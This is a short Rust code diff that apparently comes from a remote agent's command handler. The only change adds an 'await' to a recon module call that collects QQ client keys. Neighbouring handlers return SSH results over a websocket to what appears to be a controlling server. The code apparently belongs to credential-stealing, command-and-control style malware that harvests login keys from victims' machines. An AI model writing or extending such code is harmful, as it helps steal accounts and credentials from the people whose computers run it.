@@ -198,7 +198,7 @@ impl AgentEngine {
                 ws_send(tx, &agent_id, "othersoft.ssh.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_QQ_CLIENTKEY => {
-                let r = libra_modules::recon::QQClientKey::collect();
+                let r = libra_modules::recon::QQClientKey::collect().await;
                 ws_send(tx, &agent_id, "othersoft.qq_clientkey.result", &r, rid).await;
             }
 
